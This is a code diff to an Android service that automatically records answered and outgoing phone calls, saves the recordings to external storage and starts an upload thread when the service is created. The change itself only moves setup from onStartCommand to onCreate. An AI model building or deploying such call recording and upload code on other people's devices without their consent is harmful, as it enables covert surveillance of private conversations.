@@ -25,25 +25,28 @@ public class PhoneCallStateService extends Service
     TelListener  telListener;
 
     @Override
-    public void onCreate() {
-        super.onCreate();
-    }
-
-    @Override
-    public int onStartCommand(Intent intent, int flags, int startId)
+    public void onCreate()
     {
+        super.onCreate();
+
+        Log.e("Service", "onCreate...");
         SystemSet.getIntance().init(this.getApplicationContext());
         //开启上传线程
         Log.e("Service", "onStartCommand...");
         UploadTools.createUploadThreadAndStart();
         doInThread();
+    }
+
+    @Override
+    public int onStartCommand(Intent intent, int flags, int startId)
+    {
+
         return START_NOT_STICKY;
     }
 
     public void doInThread()
     {
         MyRecorder  recorder = new MyRecorder();
-
         //------以下应放在onStartCommand中，但2.3.5以下版本不会因service重新启动而重新调用--------
         //监听电话状态，如果是打入且接听 或者 打出 则开始自动录音
         //通话结束，保存文件到外部存储器上
